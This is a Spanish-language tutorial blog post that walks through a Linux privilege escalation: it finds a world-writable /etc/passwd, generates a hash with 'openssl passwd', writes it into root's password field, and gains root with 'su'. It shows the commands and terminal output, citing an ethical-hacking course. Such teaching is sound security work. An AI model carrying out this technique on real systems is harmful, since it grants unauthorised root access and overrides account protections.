---
layout: single
title: Escalando Privilegios - Writable - Etc/Pass & Other 1.1.2
excerpt: "El permiso -write- (w) puede ser vulnerable, ya que nos permite modificar ficheros y añadir parámetros que nos permitan escalar desde un usuario con pocos privilegios al usuario root esquivando contraseñas. En esta ocasión buscaremos desde un usuario de bajos privilegios, todos los archivos que podamos -Escribir-  y aprovechar para acceder al usuario root, sin restricción."
date: 2022-03-16
classes: wide
header:
  teaser: /assets/images/htb-writable-etc-pass-other/writable-etc-pass-other.jpg
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - vulnerabilidad
  - infosec
tags:  
  - privilegios
  - basic
  - escalar
  - suid
  - vulnerabilidad
---

![](/assets/images/htb-writable-etc-pass-other/writable-etc-pass-other.jpg)

#TERMINAL

`└──╼ $find \-writable 2>/dev/null | grep "etc"`

`$find` Nos permite buscar y encontrar archivos y directorios

`\-writable` Para indicar que buscamos archivos en los que podamos escribir.

`2>/dev/null` Para eliminar todos los archivos con los que no podamos interactuar.

`| grep` Nos permite buscar una cadena de caracteres en un archivo especifico.

__


`└──╼ $cat etc/passwd | grep "pepito"`

`$cat` Es uno de los comandos mas útiles ya que nos permite crear, fusionar o imprimir en pantalla archivos.

__


`└──╼ $ls -l etc/passwd`

`$ls`Sirve para listar archivos y directorios.

`-l` Es un indicador que nos permite listar archivos y directorios con los siguientes detalles:
    
    - Permisos de contenido
    
    - Número de enlaces al contenido
    
    - Propietario del contenido
    
    - Propietario del grupo del contenido
    
    - Tamaño del contenido en bytes
    
    - Fecha / hora de la última modificación del contenido
    
    - Nombre de archivo o directorio

__


`└──╼ $openssl passwd `

`$openssl` Es una -toolkit- Usada para asegurar las conexciones dentro en un servidor dentro de un sofware.

`passwd` Indicador para asignar una contraseña

__


`└──╼ $nano /etc/passwd`

`$nano` Es un editor de texto

__

`└──╼ $su root`

`su` Es un comando que se usa para cambiar de usuario.

#EXPLANATION

Aprovecharemos la vulnerabilidad del fichero `/passwd` el cual nos permite escribir (w) sobre él, para añadir un HASH que crearemos al generar una contraseña con la herramienta `$openssl`. Para luego acceder al usuario `root` usando el comando `$su`, ya que según el orden en el que se ejecuta se leerá nuestro HASH y no la X donde se almacena el HASH de la contraseña real de root.

#EXAMPLE

```
┌─[pepito@Tahy]─[/]
└──╼ $find \-writable 2>/dev/null | grep "etc"
./etc/systemd/network/90-mac-for-usb.link
./etc/systemd/system/iodined.service
./etc/systemd/system/samba-ad-dc.service
./etc/udev/rules.d/73-usb-net-by-mac.rules
./etc/passwd
┌─[pepito@Tahy]─[/]
└──╼ $ls -l etc/passwd
-rw-r--rw- 1 root root 3449 mar 17 07:15 etc/passwd
┌─[pepito@Tahy]─[/]
└──╼ $openssl passwd 
Password: 
Verifying - Password: 
xXeocY6cDYNVI  <- (NUESTRO HASH)
```

```
└──╼ $cat /etc/passwd | grep "root"
root:x:0:0:root:/root:/usr/bin/zsh
```

REMPLAZAMOS LA (X) por nuestro HASH

```
└──╼ $cat /etc/passwd | grep "root"
root:xXeocY6cDYNVI:0:0:root:/root:/usr/bin/zsh
```

```
┌─[✗]─[pepito@Tahy]─[/]
└──╼ $su root
Contraseña:  <-- LA CONTRASEÑAS ASIGNADA EN OPENSSL

```
#TRAINING

FUENTES: 

- [https://www.mastermind.ac/courses/introduccion-al-hacking-etico](https://www.mastermind.ac/courses/introduccion-al-hacking-etico)

